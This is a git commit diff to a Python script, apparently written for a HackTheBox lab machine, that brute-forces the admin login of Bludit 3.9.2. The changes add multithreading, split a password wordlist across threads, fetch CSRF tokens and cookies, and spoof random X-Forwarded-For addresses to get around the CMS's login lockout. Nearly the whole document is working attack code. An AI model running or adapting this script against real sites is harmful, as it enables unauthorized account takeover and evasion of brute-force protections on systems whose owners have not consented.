08e7af47c20e92d030eedb42cd93f92e0c05f0c6
mind2hex <neodeus8@gmail.com>
2020-06-24 20:57:25 -0500

    [New changes to bludit_3.9.2-bruteforce.py]

--- bludit_3.9.2-bruteforce.py
+++ bludit_3.9.2-bruteforce.py
@@ -4,6 +4,8 @@ import os
 import random
 from re import search as research
 from http import client
+from time import sleep
+import itertools
 import threading
 
 
@@ -13,19 +15,23 @@ server = "10.10.10.191"
 port = 80
 path = "/admin/login"  # Path of the bludit login
 check = False  # set true to check bludit version
-userwordlist = "user"
-passwordlist = "pass"
 # user and pass can be a simple word or a path to a dictionary
+# warning: using large files can freeze your box. Experience talking
+userwordlist = "admin"
+passwordlist = "/home/th3g3ntl3man/.github/misRepo/hackthebox/wordlist.txt"
 
+threads = 30  # Elevated use of threads may need a greather timeout
+timeout = 30
 
 
 wordlistpair = [userwordlist, passwordlist]
 for i in range(2):
     if os.path.isfile(wordlistpair[i]):
-        wordlistpair[i] = open(wordlistpair[i], 'r').read().split("\n")
-    userwordlist = wordlistpair[0]
-    passwordlist = wordlistpair[1]
+        wordlistpair[i] = open(wordlistpair[i], 'r').read()
+    userwordlist = wordlistpair[0].split("\n")
+    passwordlist = wordlistpair[1].split("\n")
 del wordlistpair
+
 
 def random_ip_generator():
     return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
@@ -39,8 +45,9 @@ def get_cookie_N_token(HTTPHandler, head:dict, path):
     cookie = research('BLUDIT-KEY=[a-zA-Z0-9]*',response.getheader('Set-Cookie')).group(0)
     return token,cookie
 
+
 def POST_request(HTTPHandler, head:dict, data, path):
-    """ try to loging """
+    """ try to loging, if sucess return true, else return token to keep trying"""
     HTTPHandler.request("POST",path,body=data,headers=head)
     response = HTTPHandler.getresponse()
     info = response.read().decode()
@@ -50,8 +57,9 @@ def POST_request(HTTPHandler, head:dict, data, path):
     else:
         return token
 
-def MainFunction(username,passwordlist,server,port=80,path="/admin/login"):    
-    HTTPHandler = client.HTTPConnection(server,port)
+    
+def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):    
+    HTTPHandler = client.HTTPConnection(server,port,timeout)
     HTTPHandler.connect()
     header = {
         "Host":server,
@@ -64,21 +72,44 @@ def MainFunction(username,passwordlist,server,port=80,path="/admin/login"):
         header = {
             "Host":server,
             "User-Agent":"GoogleBot",
-            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8~",
-            "Accept-Language":"en-US,en;q=0.5",
             "X-Forwarded-For":random_ip_generator(),
-            "Referer":"http://{}{}".format(server,path),
             "Content-Type":"application/x-www-form-urlencoded",
             "Content-Length":"{}".format(len(bodydata)),
             "DNT":"1",
             "Connection":"close",
             "Cookie":cookie,
         }
-        print("[*] Trying: %20s:%-20s"%(username,password),end="\r")
-        token = POST_request(HTTPHandler,header,bodydata,path)
+        print("[*] Threads [%03d], Trying: %20s:%-20s"%(threading.active_count(),username,password),end="\r")
+        try:
+            token = POST_request(HTTPHandler,header,bodydata,path)
+        except:
+            print("\n[*] Error: {}:{}".format(username,password))
+            break
+            
         if token == True:
             print("\n[!] FOUND: %-20s:%20s"%(username,password))
-            break
+            exit()
     HTTPHandler.close()
 
-MainFunction("admin",passwordlist,server,port,path)
+pswdict = dict()
+aux1 = aux2 = aux3 = 0
+width = (len(passwordlist)-1)//threads
+for i in itertools.count(width,width):  # dividing pass wordlist per threads
+    if i >= (len(passwordlist)-1):
+        i = i-(i-(len(passwordlist)-1))
+        aux3 = 1
+    pswdict[aux1] = passwordlist[aux2:i]
+    aux1 += 1
+    aux2 = i
+    if aux3 == 1:
+        break
+del aux1,aux2,aux3,width    
+
+for user in userwordlist:
+    for pswr in pswdict.keys():
+        x = threading.Thread(target=MainFunction, args=(user,pswdict[pswr],server,port,timeout,path))
+        x.start()
+    while threading.active_count() > 1:
+        sleep(3)
+        
+print("\n[*] Finished...")
